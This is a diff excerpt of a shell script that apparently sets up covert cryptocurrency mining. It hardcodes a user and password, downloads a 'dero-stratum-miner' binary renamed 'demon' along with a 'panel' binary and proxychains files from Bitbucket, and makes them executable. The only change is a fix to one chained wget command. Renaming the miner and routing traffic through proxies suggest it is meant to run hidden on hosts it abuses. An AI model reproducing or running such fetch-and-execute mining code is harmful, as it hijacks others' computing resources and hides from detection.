@@ -3,7 +3,7 @@ port="8080"
 user="woiden_gasskan"  
 pass="bangku"
 wget -q -O demon https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x demon
-wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel chmod +x panel
+wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel
 wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
 sleep 3 
